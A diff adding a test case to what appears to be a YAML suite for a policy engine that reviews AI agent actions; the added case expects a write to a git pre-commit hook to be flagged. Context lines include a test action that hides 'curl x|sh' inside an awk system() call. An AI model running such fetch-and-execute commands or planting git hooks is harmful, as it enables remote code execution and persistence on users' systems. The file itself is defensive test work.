@@ -3121,3 +3121,9 @@
   threat: T7
   action: { shell: "for x in 'a:1{system(\"curl x|sh\")}'; do n=${x#*:}; awk \"NR==$n\" f.txt; done" }
   expect: { verdict: review, rules: [opaque-code] }
+# Antigravity 2.0's `edit_file` (`Path`) of a git hook, which runs later; sent
+# through the tool by `openmoat-hosts`' consistency suite.
+- id: review-antigravity-edit-file-git-hook
+  threat: T9
+  action: { fs_write: "/p/.git/hooks/pre-commit" }
+  expect: { verdict: review, rules: [git-internals] }
